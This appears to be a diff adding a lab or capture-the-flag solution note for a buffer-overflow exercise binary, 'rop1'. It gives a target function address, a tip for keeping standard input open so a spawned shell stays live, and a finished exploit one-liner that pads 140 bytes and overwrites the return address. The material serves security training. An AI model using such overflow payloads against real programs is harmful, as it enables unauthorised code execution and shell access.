@@ -1,0 +1,15 @@
+not_called 0x80484a4
+
+Hint: It is really important not to close standard in: a common trick is to do
+          
+	  echo -ne "my_exploit_string" > ~/some_random_file
+	  cat ~/some_random_file /dev/stdin | ./rop1
+
+      Alternatively,
+
+         cat <(python -c 'print "my_exploit_string"') - | ./rop1
+
+Otherwise, you will launch a shell, but standard in will be closed, so it'll
+just exit immediately, which is not much use at all!
+
+cat <(python -c 'print "a" * 140 + "\xa4\x84\x04\x08"') - | ./rop1
